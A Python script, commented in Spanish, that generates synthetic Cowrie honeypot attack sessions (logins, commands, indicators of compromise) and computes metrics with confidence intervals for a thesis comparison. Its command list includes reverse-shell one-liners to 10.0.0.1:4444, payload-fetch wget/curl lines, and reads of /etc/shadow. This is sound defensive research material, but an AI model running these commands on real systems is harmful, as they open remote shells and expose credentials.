#!/usr/bin/env python3
"""
M3 — Generador de Datos Sintéticos para Comparación
----------------------------------------------------
Genera datos ficticios realistas basados en los parámetros del proyecto
para comparación con el trabajo de un compañero. Los datos NO son reales
y se descartan después de la comparación.

Uso:
  python scripts/m3_generar_sinteticos.py [--sessions 20] [--output comparacion.json]

Los archivos generados NO se suben al repositorio (ver .gitignore).
"""

import sys
sys.stdout.reconfigure(encoding="utf-8")

import json
import random
import argparse
from datetime import datetime, timedelta
from pathlib import Path

COMPOSE_DIR = Path(__file__).resolve().parent.parent

# ── Parámetros realistas del proyecto ──────────────────────────
# Basados en los datos reales de la tesis

PROTOCOLS = ["ssh", "telnet"]
EVENT_TYPES = {
    "cowrie.session.connect": 0.15,
    "cowrie.login.failed": 0.40,
    "cowrie.login.success": 0.05,
    "cowrie.command.input": 0.30,
    "cowrie.session.closed": 0.10,
}

ATTACK_IPS = [
    "45.33.32.156", "185.220.101.34", "193.142.30.77", "62.210.105.116",
    "23.129.64.210", "176.9.29.100", "89.248.165.219", "141.98.10.63",
    "51.159.115.233", "185.56.83.83", "91.132.147.230", "77.247.181.163",
    "198.54.128.102", "103.152.220.7", "45.77.123.10", "172.104.24.162",
    "139.162.166.30", "209.141.55.18", "178.62.197.203", "128.199.148.161",
    "134.122.76.248", "68.183.82.145", "165.227.83.149", "206.81.15.27",
    "45.32.128.203", "104.248.41.37", "167.172.57.43", "129.213.82.174",
    "192.241.60.82", "157.245.218.198"
]

COMMON_USERNAMES = [
    "admin", "root", "administrator", "user", "guest", "test", "oracle",
    "tomcat", "postgres", "mysql", "www-data", "ubuntu", "operator",
    "backup", "deploy", "jenkins", "git", "docker", "ansible", "ec2-user"
]

COMMON_PASSWORDS = [
    "123456", "admin", "password", "root", "toor", "admin123", "test",
    "guest", "12345678", "qwerty", "abc123", "letmein", "passw0rd",
    "111111", "default", "changeme", "secret", "master", "1234", "login"
]

SUSPICIOUS_COMMANDS = [
    "whoami", "id", "uname -a", "hostname", "cat /etc/passwd", "cat /etc/shadow",
    "ls -la /home", "ls -la /tmp", "netstat -an", "ps aux", "w", "df -h",
    "wget http://example.com/payload", "curl http://example.com/beacon",
    "chmod 777 /tmp", "mkdir /tmp/.hidden", "rm -rf /tmp/*", "cd /tmp",
    "python -c 'import os;os.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")'",
    "nc -e /bin/bash 10.0.0.1 4444", "cat /proc/cpuinfo", "free -m",
    "crontab -l", "find / -perm -4000 2>/dev/null", "cat /etc/ssh/sshd_config"
]

COUNTRIES = [
    ("China", 0.30), ("Rusia", 0.20), ("Estados Unidos", 0.12),
    ("Brasil", 0.08), ("India", 0.06), ("Vietnam", 0.05),
    ("Indonesia", 0.04), ("Alemania", 0.04), ("Francia", 0.03),
    ("Paises Bajos", 0.03), ("Otros", 0.05)
]

IOC_TYPES = ["ip", "credential", "command", "hash", "domain", "url"]
IOC_CONFIDENCE = ["ALTO", "MEDIO", "BAJO"]


def weighted_choice(choices_weights):
    items, weights = zip(*choices_weights)
    return random.choices(items, weights=weights, k=1)[0]


def generate_session(session_id: int, start_time: datetime) -> dict:
    """Genera una sesión completa de ataque."""
    src_ip = random.choice(ATTACK_IPS)
    country = weighted_choice(COUNTRIES)
    protocol = random.choice(PROTOCOLS)

    events = []
    iocs = []
    commands_executed = []

    # 1. Session connect
    connect_time = start_time + timedelta(seconds=random.randint(0, 5))
    events.append({
        "eventid": "cowrie.session.connect",
        "src_ip": src_ip,
        "session": f"ses{session_id:04d}",
        "timestamp": connect_time.isoformat() + "Z",
        "country": country,
        "protocol": protocol
    })

    # IoC de IP
    iocs.append({
        "type": "ip",
        "value": src_ip,
        "confidence": random.choice(["ALTO", "MEDIO"]),
        "source": "cowrie"
    })

    # 2. Login attempts (mix of failed + success)
    n_failed = random.randint(1, 8)
    login_success = random.random() < 0.7  # 70% chance of eventual success

    current_time = connect_time
    for i in range(n_failed):
        current_time += timedelta(seconds=random.randint(1, 5))
        username = random.choice(COMMON_USERNAMES)
        password = random.choice(COMMON_PASSWORDS)
        events.append({
            "eventid": "cowrie.login.failed",
            "src_ip": src_ip,
            "session": f"ses{session_id:04d}",
            "username": username,
            "password": password,
            "timestamp": current_time.isoformat() + "Z"
        })
        # IoC de credencial
        iocs.append({
            "type": "credential",
            "value": f"{username}:{password}",
            "confidence": "MEDIO",
            "source": "cowrie"
        })

    if login_success:
        current_time += timedelta(seconds=random.randint(1, 3))
        username = "admin"
        password = "test123"
        events.append({
            "eventid": "cowrie.login.success",
            "src_ip": src_ip,
            "session": f"ses{session_id:04d}",
            "username": username,
            "password": password,
            "timestamp": current_time.isoformat() + "Z"
        })

        # 3. Commands
        n_commands = random.randint(2, 10)
        selected_commands = random.sample(SUSPICIOUS_COMMANDS, min(n_commands, len(SUSPICIOUS_COMMANDS)))

        for cmd in selected_commands:
            current_time += timedelta(seconds=random.randint(1, 4))
            events.append({
                "eventid": "cowrie.command.input",
                "src_ip": src_ip,
                "session": f"ses{session_id:04d}",
                "input": cmd,
                "timestamp": current_time.isoformat() + "Z"
            })
            commands_executed.append(cmd)

            # IoC de comando (si es sospechoso)
            if any(kw in cmd for kw in ["wget", "curl", "nc", "chmod", "/bin/bash", "python"]):
                iocs.append({
                    "type": "command",
                    "value": cmd[:500],
                    "confidence": "ALTO",
                    "source": "cowrie"
                })

    # 4. Session close
    current_time += timedelta(seconds=random.randint(10, 120))
    duration_ms = int((current_time - connect_time).total_seconds() * 1000)
    events.append({
        "eventid": "cowrie.session.closed",
        "src_ip": src_ip,
        "session": f"ses{session_id:04d}",
        "timestamp": current_time.isoformat() + "Z",
        "duration_ms": duration_ms
    })

    return {
        "session_id": f"ses{session_id:04d}",
        "src_ip": src_ip,
        "country": country,
        "protocol": protocol,
        "login_success": login_success,
        "n_events": len(events),
        "n_commands": len(commands_executed),
        "commands": commands_executed,
        "events": events,
        "iocs": iocs
    }


def calculate_metrics(sessions: list) -> dict:
    """Calcula métricas P3/P4 sobre las sesiones generadas."""
    total_sessions = len(sessions)
    sessions_with_any_ioc = sum(1 for s in sessions if len(s["iocs"]) > 0)
    sessions_with_command_ioc = sum(
        1 for s in sessions
        if any(ioc["type"] == "command" for ioc in s["iocs"])
    )
    successful_logins = sum(1 for s in sessions if s["login_success"])
    total_events = sum(s["n_events"] for s in sessions)
    total_iocs = sum(len(s["iocs"]) for s in sessions)

    # IPs únicas
    unique_ips = len(set(s["src_ip"] for s in sessions))

    # Países
    country_dist = {}
    for s in sessions:
        country_dist[s["country"]] = country_dist.get(s["country"], 0) + 1

    # P3 y P4
    p3_amplio = (sessions_with_any_ioc / total_sessions * 100) if total_sessions > 0 else 0
    p3_comando = (sessions_with_command_ioc / total_sessions * 100) if total_sessions > 0 else 0
    p4 = (successful_logins / total_sessions * 100) if total_sessions > 0 else 0

    # Wilson IC 95%
    def wilson_ci(successes, total):
        if total == 0:
            return (0, 0)
        p = successes / total
        z = 1.96
        denom = 1 + z**2 / total
        center = (p + z**2 / (2*total)) / denom
        spread = z * ((p*(1-p) + z**2/(4*total)) / total) ** 0.5 / denom
        return (max(0, center - spread), min(1, center + spread))

    p3_amplio_ci = wilson_ci(sessions_with_any_ioc, total_sessions)
    p3_comando_ci = wilson_ci(sessions_with_command_ioc, total_sessions)
    p4_ci = wilson_ci(successful_logins, total_sessions)

    return {
        "total_sessions": total_sessions,
        "total_events": total_events,
        "total_iocs": total_iocs,
        "unique_ips": unique_ips,
        "sessions_with_any_ioc": sessions_with_any_ioc,
        "sessions_with_command_ioc": sessions_with_command_ioc,
        "successful_logins": successful_logins,
        "p3_amplio_pct": round(p3_amplio, 1),
        "p3_amplio_ci95": [round(p3_amplio_ci[0]*100, 1), round(p3_amplio_ci[1]*100, 1)],
        "p3_comando_pct": round(p3_comando, 1),
        "p3_comando_ci95": [round(p3_comando_ci[0]*100, 1), round(p3_comando_ci[1]*100, 1)],
        "p4_pct": round(p4, 1),
        "p4_ci95": [round(p4_ci[0]*100, 1), round(p4_ci[1]*100, 1)],
        "country_distribution": country_dist
    }


def main():
    parser = argparse.ArgumentParser(description="Generador de datos sintéticos para comparación")
    parser.add_argument("--sessions", type=int, default=20, help="Número de sesiones a generar")
    parser.add_argument("--output", type=str, default="comparacion_sintetica.json", help="Archivo de salida")
    args = parser.parse_args()

    print(f"Generando {args.sessions} sesiones sintéticas...")

    sessions = []
    start_time = datetime(2026, 9, 17, 8, 0, 0)

    for i in range(1, args.sessions + 1):
        session = generate_session(i, start_time)
        sessions.append(session)
        # Avanzar el tiempo 3-8 minutos entre sesiones
        start_time += timedelta(minutes=random.randint(3, 8))

    metrics = calculate_metrics(sessions)

    output = {
        "metadata": {
            "generated_at": datetime.now().isoformat(),
            "total_sessions": args.sessions,
            "note": "DATOS SINTÉTICOS para comparación. NO son datos reales del laboratorio."
        },
        "metrics": metrics,
        "sessions": sessions
    }

    output_path = COMPOSE_DIR / "evidencia" / args.output
    output_path.parent.mkdir(parents=True, exist_ok=True)

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)

    print(f"\n{'='*60}")
    print("RESUMEN DE DATOS SINTÉTICOS GENERADOS")
    print(f"{'='*60}")
    print(f"  Sesiones: {metrics['total_sessions']}")
    print(f"  Eventos totales: {metrics['total_events']}")
    print(f"  IoCs totales: {metrics['total_iocs']}")
    print(f"  IPs únicas: {metrics['unique_ips']}")
    print(f"  Sesiones con IoC (amplio): {metrics['sessions_with_any_ioc']}/{metrics['total_sessions']} = {metrics['p3_amplio_pct']}% IC95%[{metrics['p3_amplio_ci95'][0]}%, {metrics['p3_amplio_ci95'][1]}%]")
    print(f"  Sesiones con IoC (comando): {metrics['sessions_with_command_ioc']}/{metrics['total_sessions']} = {metrics['p3_comando_pct']}% IC95%[{metrics['p3_comando_ci95'][0]}%, {metrics['p3_comando_ci95'][1]}%]")
    print(f"  Logins exitosos: {metrics['successful_logins']}/{metrics['total_sessions']} = {metrics['p4_pct']}% IC95%[{metrics['p4_ci95'][0]}%, {metrics['p4_ci95'][1]}%]")
    print(f"\n  Archivo: {output_path}")
    print(f"  (Los datos son SINTÉTICOS y se descartan después de la comparación)")
    print("")


if __name__ == "__main__":
    main()
